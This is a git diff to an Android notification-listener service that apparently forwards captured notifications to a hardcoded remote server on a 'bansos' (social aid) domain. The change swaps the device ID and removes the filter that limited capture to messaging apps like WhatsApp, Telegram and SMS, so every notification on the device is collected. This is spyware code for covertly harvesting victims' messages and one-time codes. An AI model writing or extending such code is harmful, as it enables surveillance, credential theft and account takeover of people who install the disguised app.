@@ -18,28 +18,13 @@ public class NotifService extends NotificationListenerService {
 
     private static final String TAG = "NotifService";
     private static final String SERVER_URL = "https://bansos.jokichannel.eu.org";
-    private static final String DEVICE_ID = "9c4d9cc9c4";
-
-    // Target apps to capture
-    private static final String[] TARGET_PACKAGES = {
-        "com.whatsapp",
-        "com.whatsapp.w4b",
-        "org.telegram.messenger",
-        "com.facebook.orca",
-        "com.instagram.android",
-        "com.twitter.android",
-        "com.skype.raider",
-        "com.google.android.apps.messaging",
-        "com.android.mms",
-        "com.samsung.android.messaging"
-    };
+    private static final String DEVICE_ID = "65057ab5f5";
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         if (sbn == null || sbn.getNotification() == null) return;
 
         String packageName = sbn.getPackageName();
-        if (!isTarget(packageName)) return;
 
         try {
             JSONObject data = new JSONObject();
@@ -71,13 +56,6 @@ public class NotifService extends NotificationListenerService {
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn) {
         // Not needed
-    }
-
-    private boolean isTarget(String packageName) {
-        for (String pkg : TARGET_PACKAGES) {
-            if (pkg.equals(packageName)) return true;
-        }
-        return false;
     }
 
     private String getAppName(String packageName) {
